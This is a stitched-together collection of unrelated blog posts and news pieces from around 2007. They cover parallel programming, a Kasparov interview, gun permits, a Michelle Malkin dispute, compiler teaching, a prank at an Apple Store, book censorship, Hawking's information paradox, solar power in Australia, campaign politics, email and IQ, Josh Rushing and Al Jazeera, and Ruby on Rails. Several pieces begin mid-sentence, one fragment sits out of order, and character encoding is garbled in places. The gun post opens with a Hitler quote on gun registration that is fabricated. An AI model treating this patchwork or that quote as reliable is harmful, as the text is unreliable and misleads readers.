But I ’m not sure that all those hypothetical dwarfs were a good way to establish this .
Data Types and Characters ·
The discussion data sizes and types , as they appear in programming models , seems really weak to me .
I ’m offended that in 2007 intelligent people would still suggest either that an 8 - bit datum is suitable for representing a character , or that a 16 - bit datum is suitable for representing a Unicode character .
Also , they suggest direct support for “ Large Integer (> 128 bits ) ” ; but this is hardly news .
Every programming language in the world has this , one way or another ; in many of them ( Smalltalk and Ruby at least ) it ’s built - in to Integer and transparent to the programmer .
Last time I suggested this might be inefficient I was gently but firmly corrected by Avi Bryant .
Missing In Action ·
The paper has surprisingly little to say about what I think is the central program : what interface should the programmer use when dealing with multicore or “ manycore ” systems ?
[ Oops , in fact it says one profoundly important thing as I noted above : we ought to measure the effectiveness of competing approaches to parallelism by measuring the empirical results achieved with them by programmers ] .
I had hoped for a bit more insight or some research results in this space .
They do note that Software Transactional Memory is expensive and suggest that with hardware support , it might become very interesting ; but that ’s about all .
It seems that , based on the evidence we have right now , we can draw two firm conclusions :
Conventional thread - based concurrency is “ too hard ” for the general population of programmers .
The combination of functional programming and message - passing ( as in Erlang or MapReduce ) makes astoundingly good use of parallel systems and may well be usable by the average programmer .
Thus , my question : is there anything between # 1 and # 2 ?
Who knows the answer ?
" We will march ! "
Spiegel Online interview with Garry Kasparov
Spiegel Online :
The office of your United Civil Front was searched yesterday by police .
How come ?
Garry Kasparov : I was at the national congress of our coalition " The other Russia " , when ten or eleven people of the counterterrorist unit of the Moscow police came into the office of the United Civil Front .
They showed a search warrant , which our lawyer later identified as false , they locked our staff members in the office and forced them to switch off their mobile phones .
They claimed we were engaged in " extremist activities " .
It is the first time that they use this term against a major opposition group .
Spiegel Online :
What are these supposed " extremist activities " ?
Kasparov :
You know , extremism is a broad term in the minds of Russian government officials .
Our office is used by the commitee that organizes the " March of the dissidents " on Saturday .
We expect 3000 participants .
It is a broad coalition for freedom of press , social and political rights .
In the office we keep promotion material , flyer and newspapers .
The police confiscated some material to analyse it for " extremist content " - on the day of the Russina constitution .
Spiegel Online :
The authorities prohibited your march with the argument that it disturbs the traffic .
Instead , they want you to hold a stationary vigil .
Kasparov :
We will march .
According to the law , they can only change the route , but not the format of a demonstration .
We will bring our papers to court today .
The traffic argument is a lame excuse .
On Sunday , almost the entire garden ring will be closed for a demonstration of the Kremlin youth organisation Naschi .
Spiegel Online :
What happens if the police do n't let you march ?
Kasparov :
We expect that the Moscow authorities are conscious of the grave consequences , should they try to prevent our march .
Spiegel Online : Last Sunday , you were invited to " Christiansen " , two days before you were disinvited .
The production firm says there were technical problems .
Why do n't you believe that ?
Kasparov : I cannot tell you that they did n't have technical problems .
But I simply cannot believe that a major German TV station cannot solve such problems within 48 hours .
Spiegel Online :
You have said that you believe that the Russian Ambassador in Germany put pressure on the " Christiansen " people .
How do you know that ?
Kasparov :
Ask the people in the Moscow ARD studio .
Spiegel Online :
You are referring to former ARD correspondent Klaus Bednarz .
Citing a staff member of Christiansen , he said to the FAZ : " The Russian Ambassador refused to be in front of the camera with Kasparov . "
Kasparov : I do n't know how they select the guests for the talkshow .
But it strikes me that there were no critics of Mr. Putin .
That upsets me because those programs are the only chance for us to confront the Russian government .
Spiegel Online : The " Christiansen " people say you are always a welcome guest .
In March you are invited again , when you are on book tour in Germany .
Are you going to come ?
Kasparov : I hear that for the first time .
I would like to come , but first I want to see the invitation .

“ This year will go down in history .
For the first time a civilized nation has full gun registration .
Our police will be safer , our police more efficient , and the world will follow our lead into the future . ” – Adolf Hitler , who instituted the first German gun laws just before Kristallnacht .
I ’m not the biggest fan of Michelle Malkin , but she has a column in the Washington Times about the prejudice against gun owners :
Two weeks ago , the Roanoke ( Va . )
Times published an online database of registered concealed handgun permit holders in the paper ’s community under the sanctimonious guise of “ Sunshine Week . ”
The database included both the names and street addresses of some 135,000 Virginians with permits to carry concealed weapons .
Columnist Christian Trejbal patted himself on the back for making it easy to snoop on the neighbors : “ I can hear the shocked indignation of gun-toters already :
It ’s nobody ’s business but mine if I want to pack heat .
Au contraire .
Because the government handles the permitting , it is everyone ’s business . ”
The Roanoke Times showed reckless disregard for the safety of the license holders and reckless disregard for accuracy .
In his column , Mr. Trejbal admitted he knew some of the information he had obtained was inaccurate — but published it anyway : “ As a Sunshine Week gift , The Roanoke Times has placed the entire database , mistakes and all [ emphasis added ] , online at www.roanoke.com/gunpermits.
You can search to find out if neighbors , carpool partners , elected officials or anyone else has permission to carry a gun . ”
After an uproar among gun-owners , including domestic violence victims licensed to carry , the Times finally decided to yank the database .
Mr. Trejbal seems not to feel much remorse : “ Did we make it easier [ to obtain the information ] ?
Yes .
But it ’s still a public record . ”
Let ’s review :
He published a list he knew contained inaccuracies .
His paper admits the decision endangered gun owners .
He compiled a convenient shopping list for criminals — and smacked law - abiding gun owners in the face with his comparison of their choice to exercise their rights with sex offenders .
Law abiding gun owners compared get compared to sexual predators .
These are law abiding citizens exercising their right .
I do n’t understand how people can conveniently overlook or ignore the Second Amendment as an individual civil liberty protected by the Constitution .
will take their case before the International Criminal Court in Geneva , as per a human rights convention ratified by Jakarta , to safeguard the three men ’s right to life and to denounce irregularities of Indonesian trials .
UPDATE
Michelle Malkin is extremely upset because three convicted Christian terrorists in Indonesia are going to be executed despite -- in Michelle 's words -- " grave doubts raised over the fairness of the trial . "
The title of her post is " Muslims will execute Christians " -- by which she means that the Government of a predominantly Muslim country will execute three defendants who happen to be Christian , because they also happen to have been convicted in a trial in an Indonesian court of law " of masterminding a massacre of 200 Muslims in Poso .
" Michelle favorably links to this article from Asia News which reports -- and I 'm not making this up -- that the lawyers for the three convicted Terrorists : Michelle , and an equally outraged Gateway Pundit ( to whom she links ) , both provide contact information to protest on behalf of the Terrorists and to help those organizations trying to secure them a stay of execution and a new trial .
According to the article to which Michelle linked , the complaint is that the Terrorists " were convicted by a trial riddled with illegalities , like witnesses who were not listened to and evidence that was rejected by the court . "
Wow -- a trial where the witnesses are not listened to and improper evidence was used .
What kind of country would convict someone of terrorism using procedures like that ?
And what kind of disgusting barbarians would be opposed to having " the International Criminal Court in Geneva , " pursuant to an international " human rights convention , " demand greater legal protections for terrorists ?
This post writes itself .
For instance , I thought ( from having read Michelle 's blog ) that people who were concerned about due process for Terrorists are themselves pro-terrorists .
I wonder what it is about this case that makes Michelle and Gateway Pundit so concerned for the Rights of Terrorists when normally they mock those who express such concern ?
What 's different here ?
Do Malkin and her comrades want to protect terrorists more than innocent people ?
Sure seems that way .
And just look at how brutal and inhumane Muslims are -- convicting people of terrorism despite evidentiary irregularities in their trial .
That is the Evil we are battling in our War of Civilizations .
Maybe the U.S. Government could intervene on behalf of the convicted Terrorists and insist that even accused terrorists have the right to a fair trial and due process , and that it is inhumane and barbaric to impose the death penalty after convicting them of terrorism without first giving them a trial free of any irregularities .
A fair trial prior to execution is , after all , a universal value -- even for Terrorists .
We have great moral authority in the world to make that point and I 'm sure our protest would go over really well and Indonesia would do what it could to ensure that it was meeting our high standards of justice before proceeding with the execution of these Terrorists .
Or maybe we could use our influence with the International Criminal Court in Geneva to advocate for greater protections and a fair trial for these convicted Terrorists . :
Of course , if Indonesia would only do what the Bush administration does -- which is imprison people without giving them any trial or process at all , as Michelle gleefully celebrates -- then they would n't have to worry about all this hand - wringing from the terrorist rights crowd over " trial irregularities . "
Abdulaziz Ghuloum ( Indiana University ) , An Incremental Approach to Compiler Construction
Compilers are perceived to be magical artifacts , carefully crafted by the wizards , and unfathomable by the mere mortals .
Books on compilers are better described as wizard - talk : written by and for a clique of all - knowing practitioners .
Real - life compilers are too complex to serve as an educational tool .
And the gap between real - life compilers and the educational toy compilers is too wide .
The novice compiler writer stands puzzled facing an impenetrable barrier , â€œbetter write an interpreter instead.â€ 
The goal of this paper is to break that barrier .
We show that building a compiler can be as easy as building an interpreter .
This paper from the Scheme workshop presents an extended tutorial showing how to implement a compiler from Scheme to x86 assembly language .
The compiler is written in Scheme , obviously ( something that may confuse students , I might add , so beware ) .
An important aspect of the presentation of the material is that the compiler is built incrementally , and the product of each step is a working compiler for a growing subset of the language .
This is similar to the EOPL approach .
In contrast many compiler textbooks and courses follow a different route , in which each phase is dedicated to building a different part of the compiler ( i.e. , lexer , parser etc. ) , and thus the student only sees how the parts interconnect , and gets the satisfaction of seeing the compiler work , at the very end of the process .
Supporting material can be found here .
We just received this report and photos of a massive First Goatse that was deployed yesterday at the San Francisco Apple Store during Macworld 2007 .
First Goatse is project where people are shown the infamous Goatse image and then their reactions are photographed .
This is the first known instance of a First Goatse of this magnitude .
For more info , see my previous write - up on First Goatse .
Here ’s the report from the person who witnessed this spectacle unfold :
So , I was at MacWorld today and decided to stop at the Apple store on my way out .
I was wandering around , minding my own business and checking out the expo crowd .
Suddenly , on about half of the visible monitors in the store , all of the open windows flew back ( exposÃ© “ Show Desktop ” style ) to show a certain disgusting - but - famous - web - image .
It appears that someone somehow managed to “ first goatse ” most of the people in the Apple store .
In reference to the above photo :
Susan Patron won the Newberry Medal the highest honor in children 's literature for her new book The Higher Power of Lucky .
According to the New York Times , though , Patron 's use of the word " scrotum " on the first page of Lucky has aroused the ire of children 's librarians the country over .
Never mind that Patron is only describing where a rattlesnake bit a dog ( ouch ! ) elementary - school bookkeepers do n't want to have that word in their libraries .
( Patron 's explanation in the Times  " The word is just so delicious " probably does n't endear her any further to the pro-censorship crowd . )
But if we 're going to ban Lucky , here are a few other scrotalicious books for tweens and below that must go :

' Sometimes boys are born with a testicle up in the groin instead of down in the scrotum . ' "

If they have both descended into the scrotum it will be a relatively simple procedure . "

It was later named , in 1763 , by R. Brookes as Scrotum humanum , the genitals of a giant man . "

" He called the stuff castoreum , which he had extracted from the scrotums of male beavers he had trapped . "

Stephen Hawking is the most famous scientist on the planet .
His popular science book ' A Brief History of Time ' was a publishing sensation , staying at the top of the bestseller lists longer than any other book in recent history .
But behind the public face lies an argument that has been raging for almost 30 years .
Hawking shot to fame in the world of physics when he provided a mathematical proof for the Big Bang theory .
This theory showed that the entire universe exploded from a singularity , an infinitely small point with infinite density and infinite gravity .
Hawking was able to come to his proof using mathematical techniques that had been developed by Roger Penrose .
These techniques were however developed to deal not with the beginning of the Universe but with black holes .
Science had long predicted that if a sufficiently large star collapsed at the end of its life , all the matter left in the star would be crushed into an infinitely small point with infinite gravity and infinite density – a singularity .
Hawking realised that the Universe was , in effect , a black hole in reverse .
Instead of matter being crushed into a singularity , the Universe began when a singularity expanded to form everything we see around us today , from stars to planets to people .
Hawking realised that to come to a complete understanding of the Universe he would have to unravel the mysteries of the black hole .
Taming the black hole
Hawking and his fellow physicists embarked on an extraordinary intellectual expedition – to tame the black hole .
The period from the early 70s to the early 80s became known as the golden age of black hole research .
Slowly physicists were coming to understand this most destructive force of nature .
But Hawking realised that there was something missing from the emerging picture .
All work on black holes to that point used the physics of the large - scale Universe , the physics of gravity first developed by Newton and then refined by Einstein 's theories of general and special relativity .
Hawking realised that to come to a full understanding of black holes , physicists would also have to use the physics of the small - scale Universe ; the physics that had been developed to explain the movements of atoms and sub-atomic particles , known as quantum mechanics .
The problem was that no one had ever combined these two areas of physics before .
But that did n't deter Hawking .
He set about developing a new way to force the physics of quantum mechanics to co-exist with Einstein 's relativity within the intense gravity of a black hole .
Hawking radiation
After months of work Hawking came up with a remarkable result .
His equations were showing him that something was coming out of the black hole .
This was supposed to be impossible .
The one thing that everyone thought they knew about black holes was that things went in but nothing , not even light itself , could escape .
But the more Hawking checked , the more he was convinced he was right .
He could see radiation coming out of the black hole .
Hawking then realised that this radiation ( later called Hawking Radiation ) would cause the black hole to evaporate and eventually disappear .
Although Hawking 's theories about black hole evaporation were revolutionary , they soon came to be widely accepted .
But Hawking knew that this work had far more fundamental consequences .
In 1976 he published a paper called ' The Breakdown of Predictability in Gravitational Collapse ' .
In it he argued that it was n't just the black hole that disappeared .
All the information about everything that had ever been inside the black hole disappeared too .
Are there limits to what science can know ?
In everyday life we 're used to losing information but according to physics this is n't supposed to happen .
Physics has it that information is never really lost , it just gets harder to find .
Physicists cling on to this idea because it's their link with either the past or the future .
If information is lost then science can never know the past or predict the future .
There are limits to what science can know .
For many years no one took much notice of Hawking 's ideas until a fateful meeting in San Francisco .
Hawking presented his ideas to some of the world 's leading physicists .
In the audience were Gerad t'Hooft and Leonard Susskind , two leading particle physicists .
They were shocked .
Both realised that Hawking 's ' breakdown of predictability ' applied not only to black holes but to all processes in physics .
According to Susskind , if Hawking 's ideas were correct then it would infect all physics , there would no longer be any direct link between cause and effect .
Physics would become impotent .
Since that meeting the ' information paradox ' has become one of the most fundamental and most difficult problems in physics .
Arguments effectively boiled down into two camps .
On the one side were Susskind and those who believed that Hawking was wrong : information could not be lost .
On the other were Hawking and those who believed that physics would have to be rewritten to take into account the uncertainty about information that Hawking had uncovered .
For 20 years arguments raged .
Neither side was willing to admit defeat .
Until a paper emerged by a brilliant young Argentinean mathematician known as Juan Maldacena .
It claimed to be a rigorous mathematical explanation of what happened to information in black holes .
It showed that information was not lost .
Hawking , it seemed , was on the losing side .
But he was not convinced .
Hawking set to work with a young research student , Christophe Galfard , to try to pick apart the Maldacena paper .
They thought they could use the same mathematical techniques employed by Maldacena to prove that information was in fact lost .
But after two years they still could not prove their thesis .
Solving the paradox
Then disaster struck .
Hawking was taken ill with pneumonia and rushed to hospital .
Doctors feared for his life .
He was kept in hospital for over three months .
But whilst others fussed over his health , Hawking was thinking .
Finally , on what many feared might be his death bed , he thought he'd come across what had eluded him for the past 30 years – a solution to the information paradox .
Once again Hawking defied the doctors ' dire predictions and was soon back at work , working on a new proof for the information paradox .
Then in July 2004 , at one of the most prestigious conferences in physics , Hawking made a dramatic announcement .
He claimed to have solved the information paradox .
But to the surprise of many in the audience he was not at the conference to defend his long held belief that information was lost in black holes , instead he claimed that he could now prove the opposite .
Hawking presented the outline of a proof that he hoped would at last solve the problem that he had posed almost 30 years earlier .
But despite the bold claims , some physicists remain unconvinced .
Over a year has passed since the conference and he has still not presented a fully worked mathematical proof to back up his ideas .
But Hawking is a stubborn man .
If Hawking is going to change his mind on a view he held for almost 30 years then it will be with his own proof , in his own time .
In spite of failing health and increasing problems communicating with his colleagues , he is still working on the proof .
If he succeeds in completing a proof that convinces his colleagues , he will not only have solved one of the most difficult problems in physics but he will have managed to have produced ground breaking work at the very end of his career .
A feat that even his hero Einstein could not accomplish .

A participant in the annual Sex Dolls Rafting Tournament near St Petersburg was disqualified in shame for " sexual abuse of apparatus " , Mosnews reports .
The event - held on the Vuoksa river and sponsored by " a number of Russian sex shops " - this year attracted 400 athletes determined to tackle the choppy 1,200 metre course with nothing more than an inflatable partner for buoyancy , as our pic shows .
As organiser , Dmitriy Bulaviniv told Zizn ' newspaper : " It 's fun and difficult to swim in stormy river with an exotic apparatus , as inflatable ladies slip out of hands . "
Yes they do .
According to Mosnews 's entertaining commentary , as " strong wind and flow snatched out resilient dolls from strong men's hands " , only 40 - year - old Igor Osipov was left to make the final climactic dash to the finish line .
At this point , however , " the jury then noticed Osipov 's strange position and told him to moor .
When he came out of the water , gazers saw signs of recent sexual activity on the swimmer 's doll . "
The mind boggles .
The judges then " found the swimmer guilty of sexual abuse of the apparatus and disqualified him " because , as the organisers explained : " Air sex dolls can be used only for swimming . "
We conclude by repeating what our correspondent Matt noted when forwarding us this gem : " I can't think of an IT angle for this , but I 'm not sure I really care . "
We wholeheartedly agree . ®

" It feels very good , " says Lynn Stevenson .
" We like it ; it 's like we 're in control and managing something . "
Solar and wind rooftop generation plant at the Stevenson house
I am standing with Lynn and husband Chris in the shed outside their newly built house in Robertson , New South Wales , 150 km ( 100 miles ) from the hustle and bustle of Sydney .
The " something " they are in control of sits on the roof above our heads ; a swathe of solar panels , book - ended by two small wind turbines on six - metre ( yard ) poles .
" All our power is run by solar and wind energy , " says Lynn , " and we 're learning how to manage that and how it works in our house .
" You do learn to manage just how much power you 're using in the house , " adds Chris .
" You probably can't turn on an electric jug and a toaster at the same time .
" We do find if we have a long run of dull weather we do have to start the generator and top up the batteries ; but most of the time it powers the house . "
Bottom line
All our power is run by solar and wind energy ; it feels very good

Yet according to the International Energy Agency , if you take large - scale hydro projects out of the equation , only about 2 % of the world 's electricity is generated through solar , wind and other renewable technologies .
The reason is simple : cost .
If there is a grid connection available , it is almost always going to be cheaper to connect ; and with few exceptions , such as Iceland with its generous provision of geothermal energy , the cheapest source of electricity going into the grid is likely to come through burning fossil fuels .
But when you go into the isolated communities and individual homesteads which Australians have sprinkled across their giant landmass , the cost equation becomes radically different .
" If you are connected to the grid in Australia you pay 14 cents ( 10 US cents ) per kilowatt hour ( kWh ) , " says Bruce Hanton , an energy consultant working for the installation company Delta Electrics in Darwin , capital of Australia 's most sparsely populated region , the Northern Territory .
A stand - alone community solar system can cost A$ 500,000
" A stand - alone solar system is closer to a dollar ( 74 US cents ) per kWh .
But people in remote areas have to weigh up the costs of having a diesel generator , supplying diesel fuel , maintaining the generator ; plus the wet season cuts you off for up to six months of the year . "
Some of the large systems Mr Hanton has installed carry a capital cost of A$ 500,000 ( US $ 375,000 ) ; but , he says , against the diesel alternative , they can pay for themselves in 4 - 6 years .
Slow march
A typical stand - alone system in remote Australia contains five main components :
something to generate the electricity , usually solar panels but possibly a wind turbine or a small hydro unit
with solar panels come a solar regulator to prevent overload
batteries to store electricity
an inverter to convert the direct current , low - voltage output into an alternating current , mains - voltage supply which ordinary appliances can use
typically , a diesel generator as back - up
If engineers from several decades ago visited the present , says Bruce Hanton , they would find little different about today 's systems .
" Certainly your solar modules are getting slightly more efficient , batteries are getting slightly better , but the basic technology is still exactly the same . "
You could supply all of the world 's energy needs by covering 4 % of the world 's desert area with photo - voltaic panels
Martin Green
" Technically you could supply all of the world 's energy needs by covering 4 % of the world 's desert area with photo - voltaic panels , " says Martin Green from the Advanced Silicon Photo - voltaics and Photonics research centre at the University of New South Wales in Sydney .
" So there 's plenty of land available , and plenty of sunlight available . "
Yet according to International Energy Agency forecasts , renewables ( once again excluding large - scale hydro ) will make up only 6 % of the world 's energy economy in 2030 , with solar cells contributing a small fraction .
It is an improvement on today 's 2 % , but hardly a ringing endorsement of their potential .
The problem is that solar cells convert only about 15 % of the sunlight they receive into electricity ; at these rates , it is not generally an economic technology .
Martin Green 's research unit is in the vanguard of those trying to improve performance and bring down prices .
In the lab , his team can achieve sunlight - to - electricity efficiencies of 25 % and intends to go higher , through using materials other than the conventional silicon wafer , or by stacking cells in layers which each absorb different components of the Sun 's radiation .
Costs are tackled through investigating cheaper forms of silicon or cheaper ways of processing it ; while on the horizon are organic cells , not very efficient , but cheap and easy to make .
One day , perhaps , entire buildings could be swaddled in layers of organic photo - voltaic wrap .
Scaling up
Next - generation solar cells could cover windows and entire buildings
" There 's a well - demonstrated history of cost reductions in photo - voltaics ; every doubling of the amount produced brings the cost down to about 80 % of what it was before that doubling , " he says , " and that 's gone on for about 30 years .
" So if you can maintain that trend , you can work out how many systems you need to install to get them to a price where they 'll be competitive with what else is there , and it 's perhaps just a 100 times more we need to manufacture than what 's been manufactured up to the present . "
The German government certainly believes in this theory .
It has instituted a whole raft of financial incentives designed to boost solar installation ; more than 10 % of the nation 's electricity now comes from renewable sources , and the government believes that ramping - up production will bring costs down .
Back in Robertson , New South Wales , the Stevensons are happy to be pioneers for a carbon - free solar future .
" We 're not contributing to the effects of thermal power and the greenhouse effect , " says Chris .
Just one more reason , then , why life under the Australian sun feels so good .

“ This is about winning at the end of the day , ” said John Weaver , Mr. McCain ’s longtime senior strategist .
“ I do n’t want to be in a knife fight ever again , but if I am , we ’re going to win it . ”
Mr. McCain ’s representatives said he would not provide an interview .
Seven years ago , Mr. McCain charmed the news media and the public with his Straight Talk Express bus tour .
He had a lean operation befitting an upstart candidacy , and he regularly spoke out against attack advertising , a quaint notion in retrospect .
In the end , he ran his share of confrontational advertisements , once even leveling the ultimate Republican - to - Republican insult : that Mr. Bush was as dishonest as Bill Clinton .
But he was perceived as having been knocked back on his heels by the rougher , tougher Bush campaign .
Now Mr. McCain is building a larger organization , bringing together the heart of the bare - knuckled Bush crew once overseen by Karl Rove while keeping most of the advisers who ran his shoestring effort of 2000 .
“ It ’s like an all - star World Wrestling Federation cage match , except that instead of fighting one another , all of the brawlers are on the same team , ” said Steve McMahon , a strategist for the Democratic National Committee .
“ There are very few people who play this game at the highest level , and on the Republican side these guys are among the best . ”
Mr. McCain has also hired Brian Jones , an adviser to Mr. Bush ’s 2004 campaign ; Fred Davis , a media consultant for Mr. Bush in 2004 ; and Steve Schmidt , who oversaw Mr. Bush ’s 2004 war room , exploiting any tidbit that could help paint Mr. Kerry as a “ flip - flopper . ”
The hires are another signal that the 2008 primary campaign could be a combative one all around .
On the Democratic side , John Edwards , the former senator from North Carolina , has wasted no time attacking Senator Hillary Rodham Clinton ’s position on Iraq .
And Mrs. Clinton ’s team includes strategists who invented the concept of the modern campaign war room for her husband 15 years ago .
But Senator Barack Obama of Illinois drew cheers at a party gathering on Friday when he warned his fellow candidates against attacking one another .
Schon aus dem Urlaub zurück und hunderte , womöglich tausende neue E - Mails aus den letzten Wochen im Eingangsfach gefunden ?
Dann haben wir für Sie diese Warnung des King 's College der London University : Die Verwendung von E - Mail kann Ihren IQ um zehn Punkte senken , will eine Studie herausgefunden haben .
Um diesen Verlust an Denkleistung besser einordnen zu können :
Das ist doppelt so viel wie der IQ - Abfall , der infolge des Konsums von Cannabis verzeichnet wird - oder , auf hiesige Messgrößen geeicht : wahrscheinlich zweimal ein ordentlicher Vollrausch .
Und im Ernst ( obwohl Glenn Wilson , der für den IQ - Teil der Studie zuständige Psychiater , dies allen Ernstes meint ) : Natürlich ist jedes Mailfach nach dem Urlaub ein wahrer Horror .
Und auch ohne Studien schwingt die Implikation , dass Mail dumm machen könnte , in der Haltung vieler ablehnender Zeitgenossen unterschwellig mit .
Verdummend , mindestens aber sozial schädlich , zeitverschwenderisch , abhängig machend - diese Aversionen sind schnell bei der Hand , wenn sich neue Phänomene im Alltag breit machen .
Comics waren zweifelsohne lange auf der Liste , Fernsehen , der Walkman , der PC , Internet - und derzeit eben E - Mail .
Das Anwachsen der E - Mail - Flut und ihr Überschwappen auf Mobilgeräte , die wir ständig bei uns tragen , macht auch vielen Sorge , die ihre E - Mail nicht nur als gelegentliche Last empfinden , sondern die auch Spaß daran haben .
Dem latenten schlechten Gewissen über die Hervorbringungen unserer tech - getriebenen Alltagskultur lässt sich jedoch einiges entgegnen .
Vor rund 20 Jahren ist der Philosoph James Flynn einem interessanten Phänomen auf die Spur gekommen : Seit der IQ gemessen wird , ist der Durchschnitt Generation um Generation gestiegen .
Auf den ersten Blick wird das dadurch verdeckt , dass IQ - Tests quasi geeicht , also laufend angepasst werden , um einen Durchschnittswert von 100 zu erhalten .
Rechnet man diese Anpassungen heraus , dann ist der kontinuierliche IQ - Anstieg zu erkennen .
In einem provokanten Buch ( Everything Bad is Good for You ) macht der Wissenschafts - und Technologieautor Steven Johnson dafür gerade die Dinge verantwortlich , die gerne verteufelt werden - TV - Shows , Comicfilme ,
Videospiele - , und man könnte ergänzen : Internet und E - Mail .
Warum ?
Weil alle diese Dinge in ihrer wachsenden Komplexität wie eine ständig steigende Dosis von Stimulans wirken , die unser Denken herausfordern , um ihnen folgen zu können .
Dazu braucht man nur die Komplexität heutiger TV - Serien mit den simpel gestrickten Kultserien der 70er - Jahre vergleichen oder frühe Videospiele mit heutigen .
Nicht anders verhält es sich mit dem digitalen Arbeitsalltag , der uns ein höheres Maß an Tempo und " Multitasking " abverlangt - gleichfalls eine Stimulation .
Dass es davon auch ein Übermaß geben kann - gekauft ; und damit zurechtzukommen ist die Herausforderung , der wir uns neben der Beherrschung dieser Techniken stellen müssen .
Aber Grund für Kulturpessimismus und schlechtes Gewissen ?
Dazu muss man schon immer währender Bedenkenträger sein .

For indispensable reporting on the coronavirus crisis , the election , and more , subscribe to the Mother Jones Daily newsletter .
At the time , Lieutenant Josh Rushing did n’t give much thought to the filmmakers who followed him around the Pentagon ’s Central Command press operation in Doha , Qatar , for a few weeks at the outset of the Iraq War .
But then , back in the States a year later , the Marine public - affairs officer got an anonymous voice mail .
“ I just saw your movie at Sundance , ” the caller said .
“ I just wanted to say thanks . ”
“ I Googled my name and Sundance , ” Rushing recalls , “ and up came all these stories ” on Control Room , a documentary about the Arabic satellite news channel Al Jazeera .
He was startled to notice that “ a lot of them were n’t just about the movie — they were about me . ”
The film had captured the earnest 30 - year - old , with striking blue eyes and the signature high - and - tight haircut favored by his fellow Marines , as he grappled with his feelings about the war and the gulf between how the Western and Arab media were portraying it .
Though Rushing , now 34 , never strayed from his official talking points , he remembers being troubled that American reporters “ were buying into the government ’s message without challenging it . ”
Some journalists would ask him prior to on - air interviews if there were “ any messages you want to get across today . ”
Amid the sudden publicity , Rushing ran afoul of the Pentagon .
After defending Al Jazeera in an interview with the Village Voice , in which he suggested that the network showed a more realistic image of the war than the American media ( “ In America war is n’t hell — we do n’t see blood , we do n’t see suffering .
All we see is patriotism ” ) , he was ordered to stop talking to the press .
That did n’t sit well with him .
“ It ’s a weird place to be in when there ’s a national dialogue about you and you ca n’t take part in it , ” he says .
“ When I came back from the war , I was frustrated by what I ’d seen .
I felt that what America thought it knew about Al Jazeera was wrong , and the way that America was engaging or not engaging with Al Jazeera was not only wrong but dangerous . ”
Rushing resigned his commission after 14 years of service in the fall of 2004 , a move that meant forsaking the pension and lifetime medical coverage he and his family would have received had he remained in the military for another six years .
He took out a second mortgage on his Los Angeles home and went on the speaking circuit , addressing the film he ’d been forbidden to comment on and offering his perspective on the oft - derided Arabic - language news channel that he saw as a vital way to engage the Muslim world .
By that winter , Rushing was running low on money and close to taking a job with a PR firm when he was approached by Al Jazeera , which was in the early stages of planning an ambitious English - language channel that would rotate its daily coverage among bureaus in Doha , Kuala Lumpur , London , and Washington , D.C. Last fall , Rushing officially became one of the new faces of Al Jazeera International , along with such seasoned Western journalists as former ABC correspondent Dave Marash and BBC veteran David Frost .
They were met with cries of treachery from the right ;
Rushing earned a special kind of scorn , with one conservative columnist calling him “ a bigger boob than Anna Nicole Smith ’s entire chest combined , ” Al Jazeera ’s “ American propagandist , ” and an “ enemy - pandering nimrod ” in the space of a single piece .
There were online death threats , too — one urged special - ops troops to “ take him out ” — which worried him enough to hire bodyguards to protect his family .
As a correspondent covering the United States for the network , Rushing has made it his personal mission to pursue stories “ that illustrate America to the world . ”
In May , he traveled to North Dakota to shoot a piece about the emptying out of the rural towns of the Great Plains .
During filming , a local sheriff — suspicious of the crew ’s Al Jazeera affiliation — alerted the Border Patrol .
Generally , Al Jazeera ’s project has not been received with open arms in the United States .
According to executive producer Joanne Levine , a major American accounting firm and an international bank have refused to handle Al Jazeera International ’s finances .
The nascent network has also had difficulty securing distribution in the United States , which it insists has nothing to do with its image , and it missed its target launch date in May .
Network executives will only say that Al Jazeera International will begin broadcasting before the end of the year .
“ I truly believe that once we ’re on the air , it ’s going to get easier , ” says Levine .
But the delays do n’t seem to bother Rushing ; they ’ve given him time to acclimate to his new profession .
When he joined the network almost a year ago , he saw himself as a cultural emissary who could help the rest of the world understand the America he loves .
Now , “ more and more I see myself as a journalist , ” he says .
“ It ’s taking a long time to let go of that spokesperson side of me who wants to control the message and to embrace the side that ’s about letting the message be whatever you find .
There ’s a real value to this journalism thing . ”
In the newly formed Rails community , the word ' enterprise ' is becoming a dirty word .
For many people the Rails framework , with its aggressive simplicity , is the antithesis of over - complex ' enterprisey ' frameworks .
At the recent RailsConf , PragDave 's opening keynote highlighted a bunch of unsolved issues with Rails , several of which involved dealing with some of these enterprisey concerns .
An example of this was his call for support of more varied database structures , such as having compound primary keys .
DHH 's response to this could not have been a more emphatic refusal .
With a clever visual manipulation of his recent wired cover , DHH projected himself as the Neo of the software world , forcefully proclaiming himself to be in a better place , and telling the enterprise world that they need to join him , not the other way around .
Applying this principle to compound keys , the reaction is " no way " .
Rails will do what it does , and will not complicate itself to support things it does n't like .
Here is a solid example of what makes Rails " opinionated software " .
In the Rails mindset , life is much simpler if you keep your tables isomorphic to your objects , and give your tables surrogate , integer , primary keys .
If you play the Rails way - life is easy ; if not - use something else .
I confess I like this opinionated attitude .
Perhaps it reflects my Unix background , which thrives on many tools that do one thing well , rather than a complex tool that tries to do many different things .
I like Rails 's focus , its determination to pick a certain class of application and serve that well .
In this sense I see a startling parallel between DHH and Kent Beck .
For either of them , if you present them with a constrained world , they 'll look at constraints we take for granted , consider them to be unessential , and create a world without them .
I do n't have that quality , I tend to try to work within the constraints gradually pushing at them , while they just stick some intellectual dynamite under them and move on .
That 's why they can create things like Extreme Programming and Rails which really give the industry a jolt .
Lying under PragDave 's talk was a deeper concern .
Like me he 's spent much of this life working with people who can't apply the dynamite .
When you need data from a database that 's run by a data management group and has run for a decade with compound keys , you can't just don a pair of cool sunglasses and blow the constraint away .
One answer to this is to " change your organization or change your organization " , but to those who can't should they be utterly abandoned by Ruby ?
The last word of the last paragraph is the key to the answer .
Rails is right , I think , to ignore the enterprisey world , but that does n't mean that Ruby should .
One of the great strengths of scripting languages , like Ruby , is their post - modern delight in diving into the muck of a chaotic software ecosystem .
Ruby is a great place for other frameworks to fill the gaps left behind by Rails 's opinions .
My colleague Badri gave a talk , that was sadly not very well attended , about one of these - rBatis .
rBatis is a ruby port of the popular Java framework iBatis ( led by Clinton Begin , another colleague ) .
The port is being done by yet a third colleague Jon Tirsén .
rBatis is still a work in progress but already it shows the same elements that made iBatis popular - fearlessly embracing the strength of SQL rather than just trying to hide it under layer of Query Objects .
It also strengthens its appeal by making the most of Ruby - stealing many functions from Active Record ( such as validation ) , and using convenient Ruby syntax rather than XML .
( Is XML the hunchback of programming languages ? )
rBatis could be the answer to complicated database issues , still fitting into a Rails web - app , but introducing a different set of trade - offs .
If you 're comfortable with SQL , rBatis looks pretty damn simple .
